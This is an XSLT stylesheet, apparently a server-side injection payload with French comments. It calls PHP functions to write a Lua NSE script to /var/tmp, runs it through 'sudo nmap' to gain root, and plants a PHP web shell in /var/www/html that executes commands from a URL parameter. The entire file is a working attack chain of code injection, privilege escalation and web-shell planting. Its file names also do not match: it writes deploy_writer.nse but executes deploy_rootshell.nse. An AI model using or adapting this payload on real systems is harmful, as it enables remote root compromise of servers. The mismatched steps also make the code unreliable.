<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:php="http://php.net/xsl">

  <xsl:template match="*">
    <html><body><pre>
      <!-- Étape 1 : créer un script NSE root qui écrit le shell.php -->
      <xsl:variable name="lua">
local f = io.open("/var/tmp/deploy_rootshell.nse", "w")
f:write([[
os.execute('echo "<?php echo \\"START\\n\\"; if(isset($_GET[\\"cmd\\"])) { echo shell_exec($_GET[\\"cmd\\"] . \\" 2>&1\\"); } else { phpinfo(); } echo \\"END\\n\\"; ?>" > /var/www/html/sheazeaezaell.php')
]])
f:close()
      </xsl:variable>

      <!-- Écrire le script en root -->
      <xsl:value-of select="php:function('file_put_contents', '/var/tmp/deploy_writer.nse', $lua)" />
      <xsl:text>&#10;</xsl:text>

      <!-- Exécuter le script NSE pour créer le shell -->
      <xsl:value-of select="php:function('shell_exec', 'sudo nmap --script=/var/tmp/deploy_rootshell.nse')" />
    </pre></body></html>
  </xsl:template>

</xsl:stylesheet>
